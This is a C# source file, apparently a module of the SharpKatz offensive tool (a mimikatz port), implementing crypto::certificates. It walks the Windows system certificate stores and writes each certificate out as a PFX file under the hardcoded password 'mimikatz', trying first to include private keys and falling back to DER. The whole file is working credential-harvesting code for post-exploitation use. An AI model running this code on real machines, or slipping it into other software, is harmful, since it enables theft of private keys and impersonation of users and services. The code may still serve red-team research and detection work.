//
// Author: Johto
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
// Module: crypto::certificates - Certificate store enumeration and PFX export
//

using SharpKatz.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class CertificateExport
    {
        static string[] SYSTEM_STORES = new string[] { "MY", "Root", "Trust", "CA", "UserDS" };

        /// <summary>
        /// Entry point for crypto::certificates
        /// Enumerates certificates in system stores and optionally exports them as PFX
        /// </summary>
        public static bool ExportCertificates(bool exportPfx, string outputDir)
        {
            Console.WriteLine("\n  [*] crypto::certificates");

            if (exportPfx && !string.IsNullOrEmpty(outputDir))
            {
                if (!Directory.Exists(outputDir))
                {
                    try
                    {
                        Directory.CreateDirectory(outputDir);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("   [-] Cannot create output directory: {0}", ex.Message);
                        return false;
                    }
                }
            }

            foreach (string storeName in SYSTEM_STORES)
            {
                EnumerateStore(storeName, exportPfx, outputDir);
            }

            return true;
        }

        /// <summary>
        /// Enumerate certificates in a specific system store
        /// </summary>
        private static void EnumerateStore(string storeName, bool exportPfx, string outputDir)
        {
            IntPtr hStore = Natives.CertOpenSystemStore(IntPtr.Zero, storeName);
            if (hStore == IntPtr.Zero)
            {
                return;
            }

            Console.WriteLine("\n   * System Store : '{0}'", storeName);

            IntPtr pCertContext = IntPtr.Zero;
            int certIndex = 0;

            while (true)
            {
                pCertContext = Natives.CertEnumCertificatesInStore(hStore, pCertContext);
                if (pCertContext == IntPtr.Zero)
                    break;

                certIndex++;

                // Read CERT_CONTEXT
                CERT_CONTEXT certContext = (CERT_CONTEXT)Marshal.PtrToStructure(pCertContext, typeof(CERT_CONTEXT));

                // Get subject name
                string subjectName = GetCertName(pCertContext, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0);
                string issuerName = GetCertName(pCertContext, CERT_NAME_SIMPLE_DISPLAY_TYPE, 1); // CERT_NAME_ISSUER_FLAG

                Console.WriteLine("\n    [{0}] {1}", certIndex, subjectName);
                Console.WriteLine("       Issuer  : {0}", issuerName);
                Console.WriteLine("       Key Container : -");

                if (exportPfx)
                {
                    ExportCertToPfx(pCertContext, certContext, subjectName, storeName, certIndex, outputDir);
                }
            }

            Natives.CertCloseStore(hStore, 0);

            if (certIndex == 0)
            {
                Console.WriteLine("    (empty)");
            }
        }

        /// <summary>
        /// Get certificate name string
        /// </summary>
        private static string GetCertName(IntPtr pCertContext, uint dwType, uint dwFlags)
        {
            // First call to get required buffer size
            uint size = Natives.CertGetNameStringW(pCertContext, dwType, dwFlags, IntPtr.Zero, IntPtr.Zero, 0);
            if (size <= 1)
                return "(unknown)";

            IntPtr pName = Marshal.AllocHGlobal((int)(size * 2));
            try
            {
                Natives.CertGetNameStringW(pCertContext, dwType, dwFlags, IntPtr.Zero, pName, size);
                return Marshal.PtrToStringUni(pName);
            }
            finally
            {
                Marshal.FreeHGlobal(pName);
            }
        }

        /// <summary>
        /// Export a single certificate to PFX file
        /// Creates a temporary memory store, adds the cert, then exports as PFX
        /// </summary>
        private static void ExportCertToPfx(IntPtr pCertContext, CERT_CONTEXT certContext, string subjectName, string storeName, int index, string outputDir)
        {
            // Create a temporary in-memory cert store
            IntPtr hMemStore = Natives.CertOpenStore(
                CERT_STORE_PROV_MEMORY,
                0,
                IntPtr.Zero,
                CERT_STORE_CREATE_NEW_FLAG,
                IntPtr.Zero);

            if (hMemStore == IntPtr.Zero)
            {
                Console.WriteLine("       [-] Cannot create memory store for export");
                return;
            }

            try
            {
                // Add the certificate to the memory store
                if (!Natives.CertAddCertificateContextToStore(hMemStore, pCertContext, CERT_STORE_ADD_ALWAYS, IntPtr.Zero))
                {
                    Console.WriteLine("       [-] Cannot add certificate to memory store");
                    return;
                }

                // Try to export with private key first
                string password = "mimikatz";
                CRYPT_DATA_BLOB pfxBlob = new CRYPT_DATA_BLOB();
                pfxBlob.cbData = 0;
                pfxBlob.pbData = IntPtr.Zero;

                // First call to get size
                bool hasPrivateKey = Natives.PFXExportCertStoreEx(
                    hMemStore,
                    ref pfxBlob,
                    password,
                    IntPtr.Zero,
                    EXPORT_PRIVATE_KEYS | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY);

                if (!hasPrivateKey || pfxBlob.cbData == 0)
                {
                    // Try without private key
                    pfxBlob.cbData = 0;
                    pfxBlob.pbData = IntPtr.Zero;

                    hasPrivateKey = false;
                    bool exported = Natives.PFXExportCertStoreEx(
                        hMemStore,
                        ref pfxBlob,
                        password,
                        IntPtr.Zero,
                        0);

                    if (!exported || pfxBlob.cbData == 0)
                    {
                        Console.WriteLine("       [-] PFX export failed (no private key, public cert only)");

                        // Export as DER
                        ExportCertToDer(certContext, subjectName, storeName, index, outputDir);
                        return;
                    }
                }

                // Allocate buffer and export
                pfxBlob.pbData = Marshal.AllocHGlobal((int)pfxBlob.cbData);

                try
                {
                    bool success;
                    if (hasPrivateKey)
                    {
                        success = Natives.PFXExportCertStoreEx(
                            hMemStore,
                            ref pfxBlob,
                            password,
                            IntPtr.Zero,
                            EXPORT_PRIVATE_KEYS);
                    }
                    else
                    {
                        success = Natives.PFXExportCertStoreEx(
                            hMemStore,
                            ref pfxBlob,
                            password,
                            IntPtr.Zero,
                            0);
                    }

                    if (success && pfxBlob.cbData > 0)
                    {
                        byte[] pfxData = new byte[pfxBlob.cbData];
                        Marshal.Copy(pfxBlob.pbData, pfxData, 0, (int)pfxBlob.cbData);

                        string safeSubject = SanitizeFileName(subjectName);
                        string fileName = string.Format("{0}_{1}_{2}.pfx", storeName, index, safeSubject);
                        string filePath = Path.Combine(outputDir ?? ".", fileName);

                        File.WriteAllBytes(filePath, pfxData);
                        Console.WriteLine("       [+] Exported to: {0} (password: {1})", filePath, password);
                        if (hasPrivateKey)
                            Console.WriteLine("       [+] Private key exported");
                    }
                    else
                    {
                        Console.WriteLine("       [-] PFX export failed");
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(pfxBlob.pbData);
                }
            }
            finally
            {
                Natives.CertCloseStore(hMemStore, 0);
            }
        }

        /// <summary>
        /// Export certificate as DER (public cert only, no private key)
        /// </summary>
        private static void ExportCertToDer(CERT_CONTEXT certContext, string subjectName, string storeName, int index, string outputDir)
        {
            if (certContext.cbCertEncoded > 0 && certContext.pbCertEncoded != IntPtr.Zero)
            {
                byte[] certData = new byte[certContext.cbCertEncoded];
                Marshal.Copy(certContext.pbCertEncoded, certData, 0, (int)certContext.cbCertEncoded);

                string safeSubject = SanitizeFileName(subjectName);
                string fileName = string.Format("{0}_{1}_{2}.der", storeName, index, safeSubject);
                string filePath = Path.Combine(outputDir ?? ".", fileName);

                File.WriteAllBytes(filePath, certData);
                Console.WriteLine("       [+] Public cert exported to: {0}", filePath);
            }
        }

        /// <summary>
        /// Sanitize string for use as filename
        /// </summary>
        private static string SanitizeFileName(string name)
        {
            if (string.IsNullOrEmpty(name))
                return "unknown";

            char[] invalid = Path.GetInvalidFileNameChars();
            StringBuilder sb = new StringBuilder();
            foreach (char c in name)
            {
                if (Array.IndexOf(invalid, c) < 0 && c != ' ')
                    sb.Append(c);
                else
                    sb.Append('_');
            }

            string result = sb.ToString();
            if (result.Length > 50)
                result = result.Substring(0, 50);

            return result;
        }
    }
}
